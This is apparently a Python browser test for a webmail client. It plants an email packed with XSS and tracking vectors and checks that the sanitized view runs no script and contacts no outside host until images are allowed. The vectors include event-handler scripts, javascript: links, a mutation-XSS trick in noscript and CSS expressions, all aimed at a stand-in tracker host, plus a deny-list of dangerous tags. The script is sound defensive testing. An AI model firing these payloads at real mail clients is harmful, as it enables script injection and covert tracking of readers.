"""Opens a message built from tracking and script-injection tricks in real
Chrome and checks two things: nothing in it executes, and the browser makes
no request to any other host until the reader asks for images.

usage: browser_hostile.py BASE EMAIL PASSWORD IMAP_HOST:PORT:USER:PASS
"""
import imaplib, sys, time
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

BASE, EMAIL, PASSWORD, IMAP = sys.argv[1:5]
T = "https://tracker.example"
VECTORS = f"""
<html><head>
<meta http-equiv="refresh" content="0;url={T}/meta-refresh">
<base href="{T}/base/">
<link rel="stylesheet" href="{T}/link.css"><link rel="prefetch" href="{T}/prefetch"><link rel="dns-prefetch" href="{T}">
<style>@import url({T}/import.css); body {{ background: url({T}/style-bg.png) }} @font-face {{ font-family: x; src: url({T}/font.woff) }}</style>
<script>document.title='pwned'; window.pwned=1; fetch('{T}/script-fetch')</script>
<script src="{T}/ext.js"></script>
</head><body background="{T}/body-bg.png" onload="window.pwned=2;document.title='pwned'">
<p id="marker">visible text</p>
<img src="{T}/img.gif"><img srcset="{T}/srcset.png 1x"><img src="//tracker.example/protocol-relative.gif">
<img src="x" onerror="window.pwned=3;document.title='pwned'"><img src="relative.png"><img src="/api/logout">
<picture><source srcset="{T}/picture.webp"><img src="{T}/picture.png"></picture>
<video poster="{T}/poster.png" src="{T}/video.mp4" autoplay></video><audio src="{T}/audio.mp3" autoplay></audio>
<iframe src="{T}/iframe"></iframe><object data="{T}/object"></object><embed src="{T}/embed">
<svg><image href="{T}/svg-image.png"/><script>window.pwned=4</script><a xlink:href="javascript:window.pwned=5"><text y="20">svg</text></a></svg>
<math><maction actiontype="statusline#{T}/math">x</maction></math>
<table background="{T}/table-bg.png"><tr><td background="{T}/td-bg.png" style="background-image:url({T}/inline-style.png)">cell</td></tr></table>
<div style="background:url('{T}/div-bg.png');list-style-image:url({T}/list.png);content:url({T}/content.png)">styled</div>
<div style="width:expression(window.pwned=6);behavior:url({T}/behavior.htc);-moz-binding:url({T}/binding.xml)">old tricks</div>
<form action="{T}/form" method="post"><input name="password" autofocus onfocus="window.pwned=7"><input type="image" src="{T}/input-image.png"><button formaction="{T}/formaction">go</button></form>
<a href="javascript:window.pwned=8" id="jslink">js link</a><a href="{T}/ping-target" ping="{T}/ping">ping</a>
<a href="data:text/html,<script>window.pwned=9</script>">data link</a><a href="vbscript:msgbox(1)">vb</a>
<details open ontoggle="window.pwned=10">d</details><marquee onstart="window.pwned=11">m</marquee>
<input onfocus="window.pwned=12" autofocus><select autofocus onfocus="window.pwned=13"></select><textarea autofocus onfocus="window.pwned=14"></textarea>
<bgsound src="{T}/bgsound.mid"><applet code="{T}/applet"></applet><frameset><frame src="{T}/frame"></frameset>
<noscript><p title="</noscript><img src=x onerror=window.pwned=15>"></noscript>
<xmp><script>window.pwned=16</script></xmp><plaintext></plaintext>
</body></html>
"""
RAW = ("From: Attacker <attacker@evil.example>\r\nTo: {to}\r\nSubject: {subj}\r\nMIME-Version: 1.0\r\n"
       "Content-Type: text/html; charset=utf-8\r\n\r\n").replace("{to}", EMAIL)

subject = f"Hostile {int(time.time())}"
host, port, user, pw = IMAP.split(":")
im = imaplib.IMAP4(host, int(port))
im.login(user, pw)
im.append("INBOX", "", imaplib.Time2Internaldate(time.time()), (RAW.replace("{subj}", subject) + VECTORS).encode())
im.logout()

local = urlparse(BASE).hostname
foreign, fails = [], []
with sync_playwright() as p:
    b = p.chromium.launch(executable_path="/usr/bin/google-chrome", args=["--no-sandbox"])
    ctx = b.new_context(viewport={"width": 1300, "height": 900})
    page = ctx.new_page()
    page.on("request", lambda r: foreign.append(r.url) if urlparse(r.url).hostname not in (local, None) and not r.url.startswith(("data:", "blob:", "about:")) else None)
    page.goto(BASE)
    page.fill("input[type=email]", EMAIL)
    page.fill("input[type=password]", PASSWORD)
    page.click("button[type=submit]")
    page.locator(".row", has_text=subject).first.wait_for(timeout=10000)
    page.locator(".row", has_text=subject).first.click()
    page.wait_for_selector("iframe.mailframe")
    page.wait_for_timeout(2500)
    frame = page.frames[-1]
    import re
    # Ordinary links may point anywhere; nothing else may mention the tracker.
    html = re.sub(r'href="https://tracker\.example/[^"]*"', 'href=""', frame.content().lower())
    if "visible text" not in html:
        fails.append("legitimate content missing")
    if foreign:
        fails.append(f"requests to other hosts with images hidden: {foreign}")
    for where, target in (("app", page), ("frame", frame)):
        if target.evaluate("typeof window.pwned") != "undefined":
            fails.append(f"script ran in {where}: pwned={target.evaluate('window.pwned')}")
    if "pwned" in page.title() or "pwned" in frame.evaluate("document.title"):
        fails.append("title changed by script")
    if "/login" in page.url or page.locator(".login-card").count():
        fails.append("message signed the user out")
    for bad in ("<script", "onerror", "onload", "onfocus", "ontoggle", "javascript:", "vbscript:", "<iframe", "<object", "<embed",
                "<form", "<input", "<button", "<meta", "<base", "<link", "@import", "expression(", "behavior", "-moz-binding",
                "<svg", "<math", "<video", "<audio", "<applet", "<frame", "ping=", "tracker.example", "url("):
        if bad in html.split("<body", 1)[-1]:
            fails.append(f"left in the rendered message: {bad}")
    page.screenshot(path="/tmp/shots/40-hostile.png")

    # The frame's document opened directly, as its own tab, must be just as inert.
    src = page.locator("iframe.mailframe").get_attribute("src")
    tab = ctx.new_page()
    tab.on("request", lambda r: foreign.append(r.url) if urlparse(r.url).hostname not in (local, None) and not r.url.startswith(("data:", "blob:", "about:")) else None)
    tab.goto(BASE + src)
    tab.wait_for_timeout(1500)
    if foreign:
        fails.append(f"requests to other hosts when opened directly: {foreign}")
    try:
        ran = tab.evaluate("typeof window.pwned") != "undefined"
    except Exception:
        ran = False  # the sandboxed document refuses evaluation, which is fine
    if ran:
        fails.append("script ran in the directly opened document")
    tab.close()

    # After the reader allows images, only image requests may leave.
    kinds = []
    page.on("request", lambda r: kinds.append((r.resource_type, r.url)) if "tracker.example" in r.url else None)
    page.click("text=Show images")
    page.wait_for_timeout(2500)
    non_image = [k for k in kinds if k[0] != "image"]
    if non_image:
        fails.append(f"non-image requests after allowing images: {non_image}")
    if not kinds:
        fails.append("images did not load after the reader allowed them")
    if page.frames[-1].evaluate("typeof window.pwned") != "undefined":
        fails.append("script ran after allowing images")
    print("requests after allowing images:", sorted({u for _, u in kinds}))
    page.keyboard.press("#")
    page.wait_for_timeout(600)
    b.close()

im = imaplib.IMAP4(host, int(port))
im.login(user, pw)
im.select("INBOX")
typ, d = im.uid("search", None, "SUBJECT", '"Hostile"')
for u in d[0].split():
    im.uid("store", u, "+FLAGS", "(\\Deleted)")
im.expunge()
im.logout()
if fails:
    print("HOSTILE MESSAGE TEST FAILED")
    for f in fails:
        print("  ", f)
    sys.exit(1)
print("HOSTILE MESSAGE TEST PASSED")
